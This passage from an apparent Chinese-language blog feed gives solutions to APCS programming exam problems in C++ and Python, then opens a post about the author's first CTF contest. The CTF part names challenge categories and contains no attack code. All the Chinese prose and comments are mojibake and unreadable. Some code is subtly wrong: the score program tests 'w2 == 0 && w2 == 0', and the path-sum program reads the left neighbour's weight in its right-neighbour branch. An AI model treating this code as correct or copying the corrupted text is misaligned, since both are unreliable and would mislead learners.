class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">4</span>], y[<span class="number">4</span>], w1 = <span class="number">0</span>, w2 = <span class="number">0</span>, sum[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ŠåŠå ´</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;x[<span class="number">0</span>], &amp;x[<span class="number">1</span>], &amp;x[<span class="number">2</span>], &amp;x[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;y[<span class="number">0</span>], &amp;y[<span class="number">1</span>], &amp;y[<span class="number">2</span>], &amp;y[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] + x[<span class="number">3</span>];</span><br><span class="line">    sum[<span class="number">1</span>] = y[<span class="number">0</span>] + y[<span class="number">1</span>] + y[<span class="number">2</span>] + y[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] &gt; sum[<span class="number">1</span>]) w1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] == sum[<span class="number">1</span>]) w1 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, sum[<span class="number">0</span>], sum[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸‹åŠå ´</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;x[<span class="number">0</span>], &amp;x[<span class="number">1</span>], &amp;x[<span class="number">2</span>], &amp;x[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;y[<span class="number">0</span>], &amp;y[<span class="number">1</span>], &amp;y[<span class="number">2</span>], &amp;y[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] + x[<span class="number">3</span>];</span><br><span class="line">    sum[<span class="number">1</span>] = y[<span class="number">0</span>] + y[<span class="number">1</span>] + y[<span class="number">2</span>] + y[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] &gt; sum[<span class="number">1</span>]) w2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sum[<span class="number">0</span>] == sum[<span class="number">1</span>]) w2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, sum[<span class="number">0</span>], sum[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç‹€æ…‹</span></span><br><span class="line">    <span class="keyword">if</span> (w1 == <span class="number">1</span> &amp;&amp; w2 == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Win&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (w2 == <span class="number">0</span> &amp;&amp; w2 == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Lose&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Tie&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="è·¯å¾‘å’Œ"><a href="#è·¯å¾‘å’Œ" class="headerlink" title="è·¯å¾‘å’Œ"></a>è·¯å¾‘å’Œ</h2><p><a href="/images/APCS/20190615/P2.pdf">é»æˆ‘é–±è®€é¡Œç›®</a> </p><p>çµ¦å‡ºä¸€å€‹N*Mçš„å¸¶æ¬Šé‡æ–¹é™£ï¼Œè¦æŠŠèµ°éçš„è·¯çš„æ¬Šé‡éƒ½åŠ èµ·ä¾†ï¼Œä½†æ˜¯æœ‰äº›é™åˆ¶</p><ul><li>åªèƒ½<strong>å¾æ¬Šé‡æœ€å°çš„æ ¼å­é–‹å§‹</strong></li><li>å¦‚æœæœ‰å‘¨é­æœ‰å¤šå€‹æ ¼å­å¯ä»¥èµ°ï¼Œ<strong>åªèƒ½èµ°æ¬Šé‡æœ€å°çš„</strong></li><li><strong>ä¸å¯ä»¥èµ°èµ°éçš„æ ¼å­</strong></li></ul><p>å‡è¨­æœ‰å€‹4*6çš„æ–¹é™£:<img src="/images/APCS/20190615/1906_P2_1.png"><br>é‚£ä»–çš„èµ°æ³•æœƒé•·é€™æ¨£: <img src="/images/APCS/20190615/1906_P2_2.png"></p><p><strong>ç­–ç•¥</strong> å…ˆæª¢æŸ¥å…ˆä¸Šä¸‹å·¦å³çš„æ ¼å­å¯ä¸å¯ä»¥èµ°ã€æœ‰æ²’æœ‰è¶…ç•Œï¼Œå†ä¾†çœ‹å“ªå€‹æ ¼å­æœ€å°å°±å¾€å“ªè£¡èµ°!</p><figure class="highlight cpp"><figcaption><span>P2.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 100001</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> R, C;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;R, &amp;C);</span><br><span class="line">    <span class="keyword">int</span> weight[R][C], visit[R][C]; <span class="comment">// æ¬Šé‡ è·Ÿ æœ‰æ²’æœ‰èµ°è¨ªé(èµ°éæœƒè¨­å®šæˆé0)</span></span><br><span class="line">    <span class="keyword">int</span> min_pos[<span class="number">2</span>], min; <span class="comment">// min_pos = [R, C]</span></span><br><span class="line"></span><br><span class="line">    min = INF; <span class="comment">// (é¡Œç›®çµ¦çš„ç¯„åœ)+1, é€™æ¨£å°±ä¸€å®šå¯ä»¥æ‰¾åˆ°æœ€å°å€¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; C; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> w;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w);</span><br><span class="line">            <span class="keyword">if</span> (w &lt; min) &#123; <span class="comment">// è¨˜éŒ„æ¬Šé‡æœ€å°çš„æ ¼å­ å‡ºç™¼è¦ç”¨åˆ°</span></span><br><span class="line">                min = w;</span><br><span class="line">                min_pos[<span class="number">0</span>] = i;</span><br><span class="line">                min_pos[<span class="number">1</span>] = j;</span><br><span class="line">            &#125;</span><br><span class="line">            weight[i][j] = w;</span><br><span class="line">            visit[i][j] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, min_pos[<span class="number">0</span>], min_pos[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>, ans = <span class="number">0</span>, pre_r, pre_c, r, c;</span><br><span class="line">    r = min_pos[<span class="number">0</span>];</span><br><span class="line">    c = min_pos[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        ans += weight[r][c];</span><br><span class="line">        visit[r][c] = <span class="number">1</span>;</span><br><span class="line">        pre_r = r;</span><br><span class="line">        pre_c = c;</span><br><span class="line">        <span class="comment">// printf(&quot;R: %d, C: %d, min:%d\n&quot;, r, c, min);</span></span><br><span class="line">        min = INF;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (pre_r &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r - <span class="number">1</span>][pre_c] == <span class="number">0</span> &amp;&amp; weight[pre_r - <span class="number">1</span>][pre_c] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r - <span class="number">1</span>][pre_c];</span><br><span class="line">                r = pre_r - <span class="number">1</span>;</span><br><span class="line">                c = pre_c;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_c &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r][pre_c - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; weight[pre_r][pre_c - <span class="number">1</span>] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r][pre_c - <span class="number">1</span>];</span><br><span class="line">                r = pre_r;</span><br><span class="line">                c = pre_c - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_r &lt; R - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span>(visit[pre_r + <span class="number">1</span>][pre_c] == <span class="number">0</span> &amp;&amp; weight[pre_r + <span class="number">1</span>][pre_c] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r + <span class="number">1</span>][pre_c];</span><br><span class="line">                r = pre_r + <span class="number">1</span>;</span><br><span class="line">                c = pre_c;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_c &lt; C - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r][pre_c + <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; weight[pre_r][pre_c + <span class="number">1</span>] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r][pre_c - <span class="number">1</span>];</span><br><span class="line">                r = pre_r;</span><br><span class="line">                c = pre_c + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è‡ªå·±è¦ºå¾—é€™å€‹å¯«çš„ä¸æ˜¯å¾ˆå¥½ï¼Œä½†æ˜¯ä¹Ÿæƒ³ä¸åˆ°æ›´å¥½çš„è¾¦æ³• (ã¤Ğ´âŠ‚)</p><hr><h2 id="å¡é€šçµ„åˆ"><a href="#å¡é€šçµ„åˆ" class="headerlink" title="å¡é€šçµ„åˆ"></a>å¡é€šçµ„åˆ</h2><p><a href="/images/APCS/20190615/P3.pdf">é»æˆ‘é–±è®€é¡Œç›®</a></p><p>æœ‰Må€‹å¡é€šäººç‰©ï¼ŒNå€‹å¡é€šåœ˜éšŠ<br>Mæ˜¯ä¸€å€‹æ•´æ•¸ï¼Œä»£è¡¨æœƒæœ‰å¹¾å€‹å­—æ¯ç”¨ä¾†è¡¨ç¤ºäººç‰©ï¼Œ<code>len(&#39;ABCD....&#39;) = M</code></p><p>é›†åˆç”±ä¸€å­—ä¸²è¡¨ç¤ºå­—ä¸²ä¸­å­—æ¯å¯ä»¥é‡è¤‡ä¹Ÿå¯ä»¥é¡›å€’ï¼Œ<code>ACCDDBBB = &#123;A, C, D, B&#125;</code><br>æ±‚æ²’æœ‰äº¤é›†ï¼Œä½†æ˜¯è¯é›†æ•¸é‡ç‚ºMçš„é›†åˆå„æ•¸</p><p><strong>ç­–ç•¥</strong> æŠŠå­—ä¸²è®€é€²ä¾†ä¹‹å¾Œå°±æŠŠå®ƒæ‹†æˆå­—å…ƒä¸Ÿé€²Pythonçš„set()è£¡é¢å†ç”¨seté‹ç®— <del>è¦?ä½ èªªç‚ºä»€éº¼ç”¨Python? æˆ‘å°±æ‡¶ç™Œæœ«æœŸ</del></p><figure class="highlight python"><figcaption><span>P3.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">M = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_into_char</span>(<span class="params">string</span>):</span></span><br><span class="line">    ret = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string:</span><br><span class="line">        ret.add(a)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">sets = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    get_ = <span class="built_in">input</span>()</span><br><span class="line">    sets.append(break_into_char(get_))</span><br><span class="line"></span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N - <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, N):</span><br><span class="line">        <span class="keyword">if</span> sets[i] &amp; sets[j] == <span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(sets[i] | sets[j]) == M:</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="å®Œç¾å½©å¸¶"><a href="#å®Œç¾å½©å¸¶" class="headerlink" title="å®Œç¾å½©å¸¶"></a>å®Œç¾å½©å¸¶</h2><p><a href="/images/APCS/20190615/P4.pdf">é»æˆ‘é–±è®€é¡Œç›®</a> </p><p>æ„Ÿè¬æœ‹å‹æä¾›ä¸€å€‹å¾ˆå¥½çš„è§£æ³•(Sliding window)!å­¸åˆ°æ–°åšæ³•äº†!!</p><p>é•·åº¦ç‚ºNï¼Œé¡è‰²æ•¸é‡ç‚ºM</p><p><strong>ç­–ç•¥</strong> ä½¿ç”¨ä¸€å€‹Dequeueï¼Œå¾frontå–å€¼ã€å¾endæ–°å¢ï¼Œåˆ—éšŠå…§åªæœƒä¸€æ¬¡å‡ºç¾Må€‹é¡è‰²ï¼Œé€™æ™‚åªè¦æ¯”å°åˆ—éšŠå…§ç›¸ç•°é¡è‰²æ•¸é‡æ˜¯ä¸æ˜¯ç­‰æ–¼Må°±å¥½ï¼Œæ˜¯çš„è©±é€™æ®µå°±æ˜¯<strong>å®Œç¾å½©å¸¶</strong>!!</p><figure class="highlight cpp"><figcaption><span>P4.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; occur;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; cols;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M, N, in, count = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;M, &amp;N);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;in);</span><br><span class="line">        cols.push_back(in);</span><br><span class="line">        occur[in]++;                    <span class="comment">// é¡è‰²å‡ºç¾æ¬¡æ•¸</span></span><br><span class="line">        <span class="keyword">if</span>(occur[in] == <span class="number">1</span>) count++;     <span class="comment">// åˆ—éšŠå…§é¡è‰²ç¸½æ•¸++</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == M) ans++;              <span class="comment">// å¦‚æœåˆ—éšŠå…§ç›¸ç•°é¡è‰²æ•¸é‡=M å‰‡ç™¼ç¾ä¸€æ¢å®Œç¾å½©å¸¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = M; i &lt; N; i++) &#123;</span><br><span class="line">        occur[cols[<span class="number">0</span>]]--;               <span class="comment">// å–åˆ—éšŠé ­ï¼Œå°‡åˆ—éšŠé ­å‡ºç¾æ¬¡æ•¸ - 1</span></span><br><span class="line">        <span class="keyword">if</span> (!occur[cols[<span class="number">0</span>]]) count--;   <span class="comment">// å¦‚æœåˆ—éšŠé ­çš„å‡ºç¾æ¬¡æ•¸=0ï¼Œä»£è¡¨åˆ—éšŠå…§é¡è‰²ç¸½æ•¸å°‘1</span></span><br><span class="line">        cols.pop_front();               <span class="comment">// åˆ—éšŠé ­å½ˆå‡ºåˆ—éšŠ</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;in);          <span class="comment">// è®€ä¸‹å€‹é¡è‰²</span></span><br><span class="line">        cols.push_back(in);             <span class="comment">// ä¸‹å€‹é¡è‰²é€²åˆ—éšŠ</span></span><br><span class="line">        occur[in]++;                    <span class="comment">// è©²é¡è‰²å‡ºç¾æ¬¡æ•¸+1</span></span><br><span class="line">        <span class="keyword">if</span> (occur[in] == <span class="number">1</span>) count++;    <span class="comment">// åˆ—éšŠå…§ç¸½è‰²æ•¸++</span></span><br><span class="line">        <span class="keyword">if</span> (count == M) ans++;          <span class="comment">// å¦‚æœåˆ—éšŠå…§ç›¸ç•°é¡è‰²æ•¸é‡=M å‰‡ç™¼ç¾ä¸€æ¢å®Œç¾å½©å¸¶</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™å€‹è§£æ³•æƒ³åƒèµ·ä¾†é‚„è »å¥½ç©çš„ï¼Œå°±æ˜¯ä¸€å€‹æ»‘å‹•çš„æ¯”å°å¡Šw</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;APCSåˆæŒ‘æˆ°(ï½¥Ï‰Â´ï½¥ )&lt;br&gt;è£¸è€ƒä¸Šé™£æ¸¬è©¦è‡ªå·±çš„å¯¦åŠ›æ‰€åœ¨&lt;del&gt;å…¶å¯¦æ˜¯å¤ªé«˜ä¼°è‡ªå·±&lt;/del&gt;&lt;br&gt;æ²’æ„å¤–çš„è©±æ‡‰è©²æ˜¯æ¦‚å¿µé¡Œ4ç´šåˆ†ã€å¯¦ä½œé¡Œ3ç´šåˆ†~&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯é¡Œç›®çš„Writeup(`ãƒ»Ï‰ãƒ»Â´)ï¼Œé›–ç„¶åœ¨ç¾å ´æ²’æœ‰å…¨éƒ¨å¯«å‡ºä¾†ä¸éé‚„æ˜¯è¦æœ‰è¤‡ç¿’çš„å¥½ç¿’æ…£!&lt;br&gt;å¯èƒ½å¯«å¾—å¾ˆç³Ÿï¼Œå¦‚æœæœ‰æ›´å¥½çš„å»ºè­°å¯ä»¥é€éç¤¾äº¤è»Ÿé«”è¯çµ¡æˆ‘èªªèªªä½ çš„æƒ³æ³•!&lt;/p&gt;</summary>
    
    
    
    <category term="APCS" scheme="https://twinklestar03.com/categories/APCS/"/>
    
    
    <category term="APCS" scheme="https://twinklestar03.com/tags/APCS/"/>
    
    <category term="APCS-20190616" scheme="https://twinklestar03.com/tags/APCS-20190616/"/>
    
  </entry>
  
  <entry>
    <title>MyFirstCTF-2019::åƒè³½å¿ƒå¾—</title>
    <link href="https://twinklestar03.com/Contest/CTF/MyFirstCTF_2019/"/>
    <id>https://twinklestar03.com/Contest/CTF/MyFirstCTF_2019/</id>
    <published>2019-05-29T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:34.667Z</updated>
    
    <content type="html"><![CDATA[<p>äººç”Ÿç¬¬ä¸€æ¬¡åƒåŠ CTFç«¶è³½ï¼Œè½ä¸»è¾¦å–®ä½èªªé¸æ“‡é¸æ‰‹çš„æ™‚å€™å°±æ˜¯é¸æ²’æœ‰åƒåŠ éä»»ä½•æ¯”è³½çš„ï¼Œæ‰€ä»¥æ‡‰è©²éƒ½è·Ÿæˆ‘ä¸€æ¨£éƒ½æ˜¯æ–°æ‰‹å§XDï¼Œç„¶å¾Œä¸»è¾¦å–®ä½å°±èªªå¯èƒ½æœ‰äººBypassäº†ç¯©é¸æ©Ÿåˆ¶æ··é€²ä¾†äº†w</p><a id="more"></a><hr><h2 id="é€²åˆ°æœƒå ´é–‹å¥½é›»è…¦è¨­ç½®å¥½ç’°å¢ƒå°±åœ¨ç­‰å¾…é–‹è³½ï¼Œè·Ÿåç‰Œæ‹äº†å€‹ç…§"><a href="#é€²åˆ°æœƒå ´é–‹å¥½é›»è…¦è¨­ç½®å¥½ç’°å¢ƒå°±åœ¨ç­‰å¾…é–‹è³½ï¼Œè·Ÿåç‰Œæ‹äº†å€‹ç…§" class="headerlink" title="é€²åˆ°æœƒå ´é–‹å¥½é›»è…¦è¨­ç½®å¥½ç’°å¢ƒå°±åœ¨ç­‰å¾…é–‹è³½ï¼Œè·Ÿåç‰Œæ‹äº†å€‹ç…§~"></a><strong>é€²åˆ°æœƒå ´é–‹å¥½é›»è…¦è¨­ç½®å¥½ç’°å¢ƒå°±åœ¨ç­‰å¾…é–‹è³½ï¼Œè·Ÿåç‰Œæ‹äº†å€‹ç…§~</strong></h2><p><img src="/images/MFCTF/MFCTF_nametag.jpg"></p><p>ç¬¬ä¸€æ¬¡æ¯”CTFçœŸçš„ä¸çŸ¥é“è©²å¾å“ªè£¡ä¸‹æ‰‹Orzï¼Œä½†æˆ‘é‚„æ˜¯å¤§æ¦‚çŸ¥é“æœƒæœ‰å“ªäº›é¡Œç›®åˆ†é¡(Pwn, Web, Crypto, Reverse, Misc)ï¼Œæˆ‘é‚„æ˜¯ç¡¬è‘—é ­çš®æŠŠæ¯ä¸€é¡Œé»é–‹ä¾†çœ‹çœ‹ï¼Œ<del>æœçœŸå¤§éƒ¨åˆ†éƒ½çœ‹ä¸æ‡‚!</del> </p><p>æœ€å¾Œæˆ‘é¸æ“‡æŠŠæ¯å€‹é …ç›®çš„ç¬¬ä¸€é¡Œè§£æ‰å°±å¥½ï¼Œä½†å¥½åƒçµæœä¸æ˜¯é€™æ¨£å­ww</p><hr><h2 id="è§£é¡Œè¨˜åˆ†æ¿"><a href="#è§£é¡Œè¨˜åˆ†æ¿" class="headerlink" title="è§£é¡Œè¨˜åˆ†æ¿"></a><strong>è§£é¡Œè¨˜åˆ†æ¿</strong></h2><p><img src="/images/MyFirstCTF_2019/MFCTF_challenges.png"></p><p><img src="/images/MyFirstCTF_2019/MFCTF_challenges_2.png"></p><p>ç¶ è‰²çš„æ˜¯è¢«è§£æ‰çš„é¡Œç›®é»‘è‰²çš„æ˜¯æ²’è§£æ‰çš„ï¼Œ<del>å¯è¦‹çœŸçš„é‚„å¤ªèœäº†XDD</del></p><ul><li>Pwn åŸæœ¬ä»¥ç‚ºWelcome BOFå¯ä»¥è§£æ‰ï¼Œä½†æœ€å¾Œçµæœæ˜¯æˆ‘ä¸çŸ¥é“æ€éº¼é€å‡ºpayload@_@</li><li>Cryptoçš„è©±å‰‡æ˜¯å®Œå…¨ä¸ç†Ÿæ‚‰çš„é ˜åŸŸOrz</li><li>Webçš„è©±å‰‡æ˜¯Service WorkeræŠŠFlag Cacheèµ·ä¾†ï¼Œå…¶ä»–é¡Œå®Œå…¨ä¸çŸ¥é“æ€éº¼è§£â€¦</li><li>Reverseå¾ˆç¥å¥‡çš„æŠŠç­”æ¡ˆç”¨IDA<strong>çœ‹</strong>å‡ºä¾†äº†</li></ul><hr><h2 id="æ’è¡Œæ¦œ"><a href="#æ’è¡Œæ¦œ" class="headerlink" title="æ’è¡Œæ¦œ"></a><strong>æ’è¡Œæ¦œ</strong></h2><p><img src="/images/MyFirstCTF_2019/MFCTF_place.png"></p><hr><h2 id="ç¸½çµ"><a href="#ç¸½çµ" class="headerlink" title="ç¸½çµ"></a><strong>ç¸½çµ</strong></h2><p>é€™æ¬¡çš„ç¶“é©—çœŸçš„å­¸äº†å¾ˆå¤šï¼Œè¢«æˆ‘è§£æ‰çš„é¡Œç›®åŸºæœ¬ä¸Šéƒ½æ˜¯ç¾å 